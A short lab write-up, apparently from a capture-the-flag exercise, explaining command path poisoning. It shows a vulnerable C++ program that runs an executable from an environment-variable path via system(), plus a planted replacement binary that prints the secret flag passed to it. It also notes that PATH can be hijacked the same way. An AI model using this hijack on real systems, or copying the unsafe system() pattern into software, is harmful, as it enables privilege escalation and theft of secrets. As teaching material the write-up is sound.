[EXPLOIT]
	{Command executable path poisoning} :
		If a program want to acces to an executable whose path is set from an environment variable, you can easily exploit it...
		
		Let's say we have this :
		------------------------------------------------------------------------
		//C++ code :
		#include <iostream>
		#include <fstream>
		int main()
		{
			const char* path_char = getenv("ENV_VAR_TO_GET_PATH_FROM");
			std::string path;
			if(path_char == NULL)
			{
				std::cerr << "Error : Can't find the environment variable..." << std::endl;
				exit(0);
			}
			path = path_char;
			std::string executable = "doNothing";
			std::string run = path + executable; //ENV_VAR_TO_GET_PATH_FROM/<executable>
			std::ifstream file;
			file.open("/root/Lab/env-path-poisoning/flag/flag");
			std::string args;
			file >> args;
			std::string command = run + " " + args;
			system(command.c_str());
		}
		------------------------------------------------------------------------
		
		Basicaly, this program will execute $ENV_VAR_TO_GET_PATH_FROM/doNothing and will send an argument which is the flag that we want to capture
		
		And $ENV_VAR_TO_GET_PATH_FROM/doNothing source code is :
		------------------------------------------------------------------------
		//C code :
		#include <stdio.h>

		int main(int argc, char** argv)
		{
			printf("This command is set to do nothing, as it names says !");
		}
		------------------------------------------------------------------------
		
		We can change the $ENV_VAR_TO_GET_PATH_FROM to for example /tmp/corruption using : export ENV_VAR_TO_GET_PATH_FROM=/tmp/corruption
		And we can create an executable which has exactly the same name as the one that our vulnerable program will execute ("doNothing") and our executable have to show us the argument we send :
		---------------------------------------------------------------------
		//C code :
		#include <stdio.h>

		int main(char argc, char** argv)
		{
			printf("Well, finaly we do updated to command to do something... interrestring !\n");
			printf("The argument is : %s", argv[1]);
		}
		---------------------------------------------------------------------
		Then let's try to execute our vulnerable program and... It should be good !
		
		The basic/system linux commands environment path is the "PATH" variable, so yea, we could change it !